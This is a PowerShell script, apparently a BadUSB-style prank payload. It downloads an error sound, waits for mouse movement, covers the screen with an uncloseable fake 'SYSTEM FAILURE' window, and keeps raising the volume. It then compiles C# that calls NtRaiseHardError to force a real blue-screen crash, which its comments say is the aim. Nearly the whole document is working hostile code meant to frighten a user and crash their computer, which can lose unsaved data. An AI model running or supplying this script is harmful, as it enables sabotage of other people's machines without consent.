# Download and set up the sound file
$wav = "https://github.com/MajorMarmalade/Sounds/blob/main/System%20Fail/error333-by-tunavoicemodnet_BNItpbc0.mp3?raw=true"
$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav

# Create a media player to play the sound
Add-Type -AssemblyName PresentationCore
$mediaPlayer = New-Object System.Windows.Media.MediaPlayer
$mediaPlayer.Open([System.Uri]"file:///$env:TMP\s.wav")

# Detect initial mouse position
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Wait for a mouse movement to start the sound and screen cover
while (1) {
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        break
    }
}

# Create a full-screen form to cover the screen
$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = 'Blue'

$form.Cursor = [System.Windows.Forms.Cursors]::No

# Prepare the error message and text style
$errorText = "CRITICAL ERROR #0004932: SYSTEM FAILURE DETECTED"
$font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Bold)
$stringFormat = New-Object System.Drawing.StringFormat
$stringFormat.Alignment = [System.Drawing.StringAlignment]::Center
$stringFormat.LineAlignment = [System.Drawing.StringAlignment]::Center
$whiteBrush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)

# Play the sound file
$mediaPlayer.Play()

# Function to raise the volume continuously
function Raise-Volume {
    $k=[Math]::Ceiling(100/2)
    $o=New-Object -ComObject WScript.Shell
    for($i = 0;$i -lt $k;$i++) {
        $o.SendKeys([char] 175)
    }
}

# Create a timer to control the volume and screen cover
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 200
$timer.Add_Tick({
    Raise-Volume
    $graphics = $form.CreateGraphics()
    $graphics.Clear('Blue')
    $graphics.DrawString($errorText, $font, $whiteBrush, ($form.Width / 2), ($form.Height / 2), $stringFormat)
    $graphics.Dispose()
    if ($mediaPlayer.NaturalDuration.HasTimeSpan -and $mediaPlayer.Position -ge $mediaPlayer.NaturalDuration.TimeSpan) {
        $timer.Stop()
        $form.Close()
        $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
        $comparams.CompilerOptions = '/unsafe'
        $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
        [CS]::Kill()
    }
})

# Prevent the form from closing on key press
$form.Add_KeyDown({})

# Start the timer and show the form
$timer.Start()
$form.ShowDialog()

# This section will trigger a BSOD to the users computer
$source = @"
using System;
using System.Runtime.InteropServices;
public static class CS{
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege,     out bool PreviousValue);
    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    public static unsafe void Kill(){
        Boolean tmp1;
        uint tmp2;
        RtlAdjustPrivilege(19, true, false, out tmp1);
        NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
    }
}
"@
$comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
$comparams.CompilerOptions = '/unsafe'
$a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
[CS]::Kill()
